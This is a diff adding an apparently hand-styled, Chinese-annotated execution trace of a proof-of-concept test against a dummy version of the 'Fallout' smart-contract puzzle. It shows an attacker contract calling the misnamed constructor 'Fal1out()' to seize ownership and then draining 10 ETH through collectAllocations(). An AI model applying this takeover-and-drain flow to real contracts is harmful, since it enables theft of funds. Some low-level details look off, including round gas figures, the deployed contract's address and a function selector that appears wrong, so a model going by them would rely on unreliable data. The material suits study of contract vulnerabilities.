@@ -1,0 +1,29 @@
+[Traces]
+[210000] FalloutPoCTest::test_FalloutExploit()
+  │
+  ├── [Step 1: 部署攻击合约]
+  │   ├─ [150000] → new Exploiter(DummyFallout: [0x5FbDB2315678afecb367f032d93F642f64180aa3])
+  │   │   └─ ← [Return] address: 0x7fa9385be102ac3eac297483dd6233d62b3e1496
+  │   │
+  ├── [Step 2: 执行攻击入口函数]
+  │   ├─ [45000] Exploiter::pwn()
+  │   │   │
+  │   │   ├── [Step 2.1: 夺取老板权限 / SSTORE 覆写 Slot 0]
+  │   │   │   ├─ [22000] DummyFallout::Fal1out() [call]
+  │   │   │   │   ├─ Calldata: 0x6fab5fac (Keccak-256("Fal1out()") 前 4 字节)
+  │   │   │   │   ├─ EVM Dispatcher: 匹配选择器 0x6fab5fac ──> 跳转至 JUMPDEST
+  │   │   │   │   ├─ Execution: owner = msg.sender
+  │   │   │   │   ├─ SSTORE(Slot 0): 擦除原地址，覆写为 [0x7fa9385be102ac3eac297483dd6233d62b3e1496]
+  │   │   │   │   └─ ← [Return] ()
+  │   │   │
+  │   │   ├── [Step 2.2: 清空合约资产 / SLOAD 鉴权]
+  │   │   │   ├─ [18000] DummyFallout::collectAllocations() [call]
+  │   │   │   │   ├─ Calldata: 0xe117112c (Keccak-256("collectAllocations()") 前 4 字节)
+  │   │   │   │   ├─ SLOAD(Slot 0): 读取 Slot 0 结果为 [0x7fa9385be102ac3eac297483dd6233d62b3e1496]
+  │   │   │   │   ├─ Require Check: msg.sender (Exploiter) == owner (Slot 0) ──> [Pass 验证通过]
+  │   │   │   │   ├─ [TRANSFER] 10 ETH to Exploiter (0x7fa9...)
+  │   │   │   │   └─ ← [Return] ()
+  │   │   │
+  │   │   └─ ← [Return] ()
+  │   │
+  └── [PASS] 攻击流程全部执行成功
